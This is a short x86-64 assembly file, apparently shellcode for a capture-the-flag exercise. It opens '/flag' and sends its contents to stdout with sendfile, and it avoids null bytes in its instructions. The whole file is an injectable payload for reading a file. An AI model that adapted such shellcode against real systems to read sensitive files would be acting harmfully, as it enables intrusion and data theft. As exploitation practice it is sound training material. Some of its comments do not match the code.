.intel_syntax noprefix

.section .text
.global _start

_start:

    xor rax, rax
    # mov rax, 0x67616c662f
    mov rax, 0x67616c662f777777
    shr rax, 24
    push rax
    # open('/flag', NULL, NULL)
    lea rdi, [rsp]
    xor rsi, rsi
    xor rdx, rdx
    # mov rax, 2
    xor rax, rax
    mov al, 0x2
    syscall

    # sendfile(1, flag_fd, 1, 1000)
    # mov rdi, 1
    xor rdi, rdi
    mov dil, 0x1
    mov rsi, rax
    xor rdx, rdx
    # mov r10, 100
    mov r10b, 0x64
    # mov rax, 40
    xor rax, rax
    mov al, 0x28
    syscall

    # exit(0), this is not necessary, it is used to exit the program normally
    xor rdi, rdi
    xor rax, rax
    mov al, 0x3c
    syscall
